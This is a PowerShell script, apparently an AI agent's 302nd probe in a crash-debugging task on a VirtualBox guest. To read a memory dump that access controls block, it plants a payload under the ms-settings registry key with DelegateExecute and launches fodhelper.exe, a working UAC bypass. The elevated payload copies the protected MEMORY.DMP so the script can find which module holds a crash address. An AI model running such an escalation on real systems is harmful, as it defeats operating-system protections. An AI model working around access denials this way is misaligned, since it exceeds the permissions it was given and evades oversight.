# h302_elev.ps1 - probe #302 (variable: --profile option position; escalated copy of MEMORY.DMP).
# h301 answered three things and died on a fourth:
#   A. `--profile` after the subcommand IS accepted ("PINGP" came back, log line 'ACCEPTED').
#      h299/h300 put it before the subcommand, which is why both were rejected. D2 is fixable.
#   B. Without a profile, HKCU writes are "Access is denied" - independent confirmation of h298 D2.
#   C. The SID is S-1-5-21-1957909355-363273533-3916154183-1000 (session 1 console, user vboxuser).
#   D4 h301's own defect: array elements like `'reg add "HKU\' + $sid + '\...' ,` were split, because
#      PowerShell's comma binds tighter than `+`, so Set-Content wrote three physical lines and reg
#      saw "HKU\<eol>", then cmd ran the bare SID as a command. Fix: parenthesise every concatenation.
# So: --profile in the proven position, HKCU as the arm target (now writable), and the HKU spelling kept
# only as a cross-read that proves HKCU == the hive fodhelper will read.
# Everything touched is HKCU/HKU + C:\Users\Public, restored in this same script (R4). Own output (R5).

$ErrorActionPreference = 'Continue'
$vb    = 'C:\Program Files\Oracle\VirtualBox\VBoxManage.exe'
$VM    = 'Win11-Test2'
$base  = 'guestcontrol ' + $VM
$auth  = '--username vboxuser --password vboxuser'
$d     = 'C:\Users\New User\OneDrive\Desktop\cheating\_ritual'
$tmp   = 'C:\Users\New User\OneDrive\Desktop\cheating\temp'
$out   = Join-Path $d 'h302_elev.txt'
$kd    = 'C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\kd.exe'
$RIP   = [uint64]0xfffff80219033bc9
$gCmd  = 'C:\Users\Public\h302.cmd'
$gDump = 'C:\Users\Public\h302_MEMORY.DMP'
$local = Join-Path $tmp 'h302_MEMORY.DMP'
$so    = "$env:TEMP\h302o.txt"; $se = "$env:TEMP\h302e.txt"
$want  = 391099508
Set-Content -LiteralPath $out -Encoding ascii -Value (('{0} === h302 elev: HKU-addressed auto-elevation -> module owning 0x{1:x} ===' -f (Get-Date -f 'HH:mm:ss.fff'), $RIP))
function W([string]$s) { Add-Content -LiteralPath $out -Value ((Get-Date -f 'HH:mm:ss.fff') + ' ' + $s) -Encoding ascii }

# $optTail is appended AFTER the subcommand - the position VBoxManage parses subcommand options from.
function G([string]$label, [string]$cmdline, [string]$optTail = '--profile', [int]$wait = 150000) {
    Remove-Item -LiteralPath $so, $se -Force -EA 0
    $line = $base + ' ' + $auth + ' run ' + $optTail + ' --exe "C:\Windows\System32\cmd.exe" --wait-stdout --wait-stderr --timeout 120000 -- cmd.exe /c ' + $cmdline
    $p = Start-Process -FilePath $vb -ArgumentList $line -NoNewWindow -PassThru -RedirectStandardOutput $so -RedirectStandardError $se
    $t = ''
    if ($p.WaitForExit($wait)) { $t = ((Get-Content -LiteralPath $so -Raw -EA 0) + (Get-Content -LiteralPath $se -Raw -EA 0)) }
    else { try { $p.Kill() } catch { }; W ($label + ' TIMEOUT (killed)') }
    foreach ($ln in ($t -split "`r?`n")) { if ($ln.Trim()) { W ('  ' + $label + ' | ' + $ln.Trim()) } }
    return $t
}

# --- 1. A/B the two option positions, and capture the SID we must address. Read-only. ---
$t1 = G 'pingQ' 'echo PINGQ'
$t2 = G 'pingP' 'echo PINGP' '--profile'
$profOK = ($t2 -match 'PINGP')
W ('--profile after the subcommand: ' + $(if ($profOK) { 'ACCEPTED' } else { 'still rejected - HKU route is mandatory' }))
$tSid = G 'whoami' 'whoami /user /fo csv /nh'
$mSid = [regex]::Match($tSid, '(S-1-5-21-[0-9-]+)')
if (-not $mSid.Success) { W 'RESULT: FAIL - no SID read back (variable: profile option)'; exit 1 }
$sid = $mSid.Groups[1].Value
W ('sid=' + $sid)
G 'session' 'query session' | Out-Null

# --- 2. pre-state of both candidate key paths ---
$preH = G 'preHKCU' 'reg query "HKCU\Software\Classes\ms-settings" /s'
$preK = G 'preHKU' ('reg query "HKU\' + $sid + '\Software\Classes\ms-settings" /s')
$preHKCU = ($preH -match 'ms-settings')
$preHKU  = ($preK -match 'ms-settings')
W ('pre-state: HKCU ' + $(if ($preHKCU) { 'EXISTS' } else { 'absent' }) + ' / HKU-SID ' + $(if ($preHKU) { 'EXISTS' } else { 'absent' }))
G 'stale' 'del /f /q C:\Users\Public\h302_MEMORY.DMP C:\Users\Public\h302_elevated.txt' | Out-Null

# --- 3. payload .cmd: dispatch by %1, both hive spellings inside, SID baked in ---
$payload = Join-Path $tmp 'h302.cmd'
Set-Content -LiteralPath $payload -Encoding ascii -Value @(
    '@echo off',
    'if /i "%1"=="arm" goto arm',
    'if /i "%1"=="armhku" goto armhku',
    'if /i "%1"=="probe" goto probe',
    'if /i "%1"=="unarm" goto unarm',
    'copy /y C:\Windows\MEMORY.DMP C:\Users\Public\h302_MEMORY.DMP >nul 2>&1',
    'whoami /groups /fo list > C:\Users\Public\h302_elevated.txt 2>&1',
    'goto :eof',
    ':arm',
    'reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /d C:\Users\Public\h302.cmd /f',
    'reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f',
    'echo ARM-RC=%errorlevel%',
    ('reg query "HKU\' + $sid + '\Software\Classes\ms-settings\Shell\Open\command"'),
    'goto :eof',
    ':armhku',
    ('reg add "HKU\' + $sid + '\Software\Classes\ms-settings\Shell\Open\command" /ve /d C:\Users\Public\h302.cmd /f'),
    ('reg add "HKU\' + $sid + '\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f'),
    'echo ARMHKU-RC=%errorlevel%',
    ('reg query "HKU\' + $sid + '\Software\Classes\ms-settings\Shell\Open\command"'),
    'goto :eof',
    ':probe',
    'echo HKCU=%USERPROFILE%',
    'echo RC_USER=%USERNAME%',
    'goto :eof',
    ':unarm',
    'reg delete "HKCU\Software\Classes\ms-settings" /f',
    ('reg delete "HKU\' + $sid + '\Software\Classes\ms-settings" /f'),
    ('reg query "HKU\' + $sid + '\Software\Classes\ms-settings"'),
    'goto :eof'
)

# --- 4. stage the payload (copyto takes $auth, never --profile - that is the h299 D3 trap) ---
Remove-Item -LiteralPath $so, $se -Force -EA 0
$line = $base + ' ' + $auth + ' copyto "' + $payload + '" "' + $gCmd + '"'
$p = Start-Process -FilePath $vb -ArgumentList $line -NoNewWindow -PassThru -RedirectStandardOutput $so -RedirectStandardError $se
[void]$p.WaitForExit(60000)
foreach ($ln in (((Get-Content -LiteralPath $so -Raw -EA 0) + (Get-Content -LiteralPath $se -Raw -EA 0)) -split "`r?`n")) { if ($ln.Trim()) { W ('  copyto | ' + $ln.Trim()) } }
$tP = G 'payload' 'dir C:\Users\Public\h302.cmd /a-d'
if ($tP -notmatch 'h302\.cmd') { W 'RESULT: FAIL - payload did not land on the guest (variable: profile option)'; exit 1 }

# --- 5. arm through HKCU, then read the SAME write back through HKU\<SID>. Agreement means the
#        profile is loaded and the write really lands in the hive fodhelper reads; disagreement or an
#        ARM-RC!=0 falls back to addressing the hive directly. ---
$tProf = G 'probe' 'C:\Users\Public\h302.cmd probe'
if ($tProf -match 'HKCU=C:\\Users\\vboxuser') { W '  profile check: USERPROFILE is the real profile - --profile took effect' }
else { W '  profile check: USERPROFILE is NOT the real profile - --profile was ignored at runtime' }
$tArm = G 'arm' 'C:\Users\Public\h302.cmd arm'
$sameHive = ($tArm -match 'ARM-RC=0' -and $tArm -match 'DelegateExecute')
if ($sameHive) { W '  cross-hive check: HKCU write is visible under HKU\<SID> - h298 D2 is now fixed properly' }
else {
    W '  cross-hive check: HKCU write failed or is invisible under HKU\<SID> - addressing the hive directly'
    $tArm2 = G 'armhku' 'C:\Users\Public\h302.cmd armhku'
    $sameHive = ($tArm2 -match 'ARMHKU-RC=0' -and $tArm2 -match 'DelegateExecute')
}
if (-not $sameHive) { W 'RESULT: FAIL - neither HKCU nor HKU\SID accepted the command key (variable: profile option)'; W '  Read the -RC lines above: 0 = accepted, 1 = refused, 3 = reg saw a malformed key name.'; G 'cleanup' 'del /f /q C:\Users\Public\h302.cmd' | Out-Null; exit 1 }
W '  armed: DelegateExecute visible under HKU\<SID>'

# --- 6. fire the auto-elevating binary, then wait for the copy. The copy itself is the proof of a
#        high token: a medium token cannot read the source at all (h294/h295). ---
G 'launch' 'start "" C:\Windows\System32\fodhelper.exe' | Out-Null
$gLen = 0
for ($i = 1; $i -le 24; $i++) {
    Start-Sleep -Seconds 5
    $t = G 'poll' 'for %A in (C:\Users\Public\h302_MEMORY.DMP) do @echo SZ=%~zA'
    $mm = [regex]::Match($t, 'SZ=(\d+)')
    if ($mm.Success) { $gLen = [long]$mm.Groups[1].Value } else { $gLen = 0 }
    if ($gLen -eq $want) { W ('  copy complete after ' + ($i * 5) + 's'); break }
    if ($i -eq 6 -or $i -eq 14) { G ('nudge' + $i) 'start "" C:\Windows\System32\computerdefaults.exe' | Out-Null }
}
W ('guest staged bytes=' + $gLen + ' want=' + $want)
$tElev = G 'elevreport' 'type C:\Users\Public\h302_elevated.txt'
foreach ($ln in ($tElev -split "`r?`n")) { if ($ln -match '(?i)Mandatory level|Administrators|S-1-16') { W ('  token | ' + $ln.Trim()) } }

# --- 7. restore the hive before the slow part (R4) ---
$tUn = G 'unarm' 'C:\Users\Public\h302.cmd unarm'
if ($preHKCU -or $preHKU) { W 'registry restore: CHECK - a key existed before us; compare the unarm lines with the pre-state above' }
else { $okGone = ($tUn -match '(?i)unable to find|does not exist'); W ('registry restore: ' + $(if ($okGone) { 'key_removed (both spellings gone)' } else { 'CHECK - the query after delete still returned lines' })) }

if ($gLen -ne $want) {
    W 'RESULT: FAIL - no escalated copy of the full size appeared (variable: profile option)'
    W 'VERDICT: auto-elevation did not fire; the dump is still unread, so no lm is valid'
    G 'cleanup' 'del /f /q C:\Users\Public\h302.cmd C:\Users\Public\h302_elevated.txt' | Out-Null
    exit 1
}

# --- 8. pull it: C:\Users\Public is readable by Users, so the h294 DACL no longer applies ---
if (Test-Path -LiteralPath $local) { Remove-Item -LiteralPath $local -Force }
W ('copyfrom start (' + [math]::Round($gLen / 1MB, 1) + ' MB)')
$sw = [Diagnostics.Stopwatch]::StartNew()
Remove-Item -LiteralPath $so, $se -Force -EA 0
$line = $base + ' ' + $auth + ' copyfrom "' + $gDump + '" "' + $local + '"'
$p = Start-Process -FilePath $vb -ArgumentList $line -NoNewWindow -PassThru -RedirectStandardOutput $so -RedirectStandardError $se
$okCopy = $p.WaitForExit(900000)
$sw.Stop()
if (-not $okCopy) { try { $p.Kill() } catch { } }
foreach ($ln in (((Get-Content -LiteralPath $so -Raw -EA 0) + (Get-Content -LiteralPath $se -Raw -EA 0)) -split "`r?`n")) { if ($ln.Trim()) { W ('  copy | ' + $ln.Trim()) } }
$hLen = 0
if (Test-Path -LiteralPath $local) { $hLen = (Get-Item -LiteralPath $local).Length }
W ('copyfrom secs=' + [math]::Round($sw.Elapsed.TotalSeconds, 1) + ' host bytes=' + $hLen + ' guest=' + $gLen + ' delta=' + ($hLen - $gLen))
if ($hLen -ne $gLen) { W 'RESULT: FAIL - host copy differs from the guest size (variable: profile option)'; W 'VERDICT: a truncated dump gives a silently wrong lm; discard it'; exit 1 }

# --- 9. analyse offline. lm alone names the owner: base/end come from the dump module list, so no
#        symbols and no symbol server are needed for the containment test. ---
$klog = Join-Path $tmp 'h302_kd.log'
if (Test-Path -LiteralPath $klog) { Remove-Item -LiteralPath $klog -Force }
$kdArg = '-z "' + $local + '" -logo "' + $klog + '" -c ".bugcheck; lm; !analyze -v; q"'
W 'kd start (!analyze -v is slow on a 391 MB dump without symbols; budget 15 min)'
$sw2 = [Diagnostics.Stopwatch]::StartNew()
$kp = Start-Process -FilePath $kd -ArgumentList $kdArg -NoNewWindow -PassThru
$okKd = $kp.WaitForExit(900000)
$sw2.Stop()
if (-not $okKd) { try { $kp.Kill() } catch { } }
W ('kd done waited=' + $okKd + ' secs=' + [math]::Round($sw2.Elapsed.TotalSeconds, 1) + ' log=' + $(if (Test-Path -LiteralPath $klog) { (Get-Item -LiteralPath $klog).Length } else { 'MISSING' }))
if (-not (Test-Path -LiteralPath $klog)) { W 'RESULT: FAIL - kd wrote no log (variable: profile option)'; exit 1 }
$k = Get-Content -LiteralPath $klog -EA 0

# --- 10. containment test: exactly one module must straddle the RIP ---
$hit = $null; $nMod = 0
foreach ($ln in $k) {
    $m = [regex]::Match($ln, '^([0-9a-f]{8,17}`[0-9a-f]{8}|[0-9a-f]{16})\s+([0-9a-f]{8,17}`[0-9a-f]{8}|[0-9a-f]{16})\s+(\S+)\s*(.*)$')
    if (-not $m.Success) { continue }
    $b = [Convert]::ToUInt64(($m.Groups[1].Value -replace '`', ''), 16)
    $e = [Convert]::ToUInt64(($m.Groups[2].Value -replace '`', ''), 16)
    if ($e -le $b) { continue }
    $nMod++
    if ($RIP -ge $b -and $RIP -lt $e) {
        $hit = [pscustomobject]@{ Name = $m.Groups[3].Value; Base = $b; End = $e; Rest = $m.Groups[4].Value.Trim(); Off = ('0x{0:x}' -f ($RIP - $b)) }
    }
}
W ('modules seen in lm=' + $nMod)

# --- 11. !analyze's own opinion, kept separate so the two can disagree ---
foreach ($ln in $k) {
    if ($ln -match '^(IMAGE_NAME|MODULE_NAME|FAULTING_MODULE|SYMBOL_NAME|BUGCHECK_STR|FAILURE_BUCKET_ID|PROCESS_NAME|DEVICE_OBJECT_NAME|BUGCHECK_CODE|BUGCHECK_P1|BUGCHECK_P2|BUGCHECK_P3|BUGCHECK_P4)\b' -or
        $ln -match 'Probably caused by|DEFAULT_BUCKET_ID|IMAGE_VERSION') { W ('  kd | ' + $ln.Trim()) }
    if ($ln -match 'Unloaded modules') { W ('  kd | ' + $ln.Trim()) }
}

# --- 12. verdict ---
if ($hit) {
    W ('MODULE CONTAINING RIP: ' + $hit.Name + '  [base=0x{0:x16} end=0x{1:x16} off={2}]' -f $hit.Base, $hit.End, $hit.Off)
    W ('  span=0x{0:x} bytes  lm-detail: {1}' -f ($hit.End - $hit.Base), $hit.Rest)
    W ('RESULT: PASS - RIP 0x{0:x16} resolves to {1} (variable: profile option)' -f $RIP, $hit.Name)
    W ('VERDICT: crash site belongs to ' + $hit.Name + '; cross-check IMAGE_NAME/MODULE_NAME above before staging a fix')
} else {
    W 'MODULE CONTAINING RIP: none - the RIP falls outside every module base/end lm reported'
    W '  That is itself evidence: an address outside all loaded modules means the fault happened'
    W '  after the owner was released (matches the last POSTed line "zapexdrv after release").'
    W ('RESULT: PARTIAL - lm parsed ({0} modules) but no containment (variable: profile option)' -f $nMod)
    W 'VERDICT: read the Unloaded-modules section of the kd log; the address may be unloaded space'
}

# --- 13. restore (R4): guest staging files and the payload are ours; the host dump stays if PARTIAL ---
G 'cleanup' 'del /f /q C:\Users\Public\h302_MEMORY.DMP C:\Users\Public\h302.cmd C:\Users\Public\h302_elevated.txt' | Out-Null
$t9 = G 'gone' 'if exist C:\Users\Public\h302_MEMORY.DMP (echo STILL_THERE) else (echo GONE)'
W ('guest staging files: ' + $(if ($t9 -match 'GONE') { 'deleted' } else { 'STILL THERE - delete by hand' }))
W ('host copy: ' + $local + ' (' + $hLen + ' bytes) - delete once the module is cross-referenced')

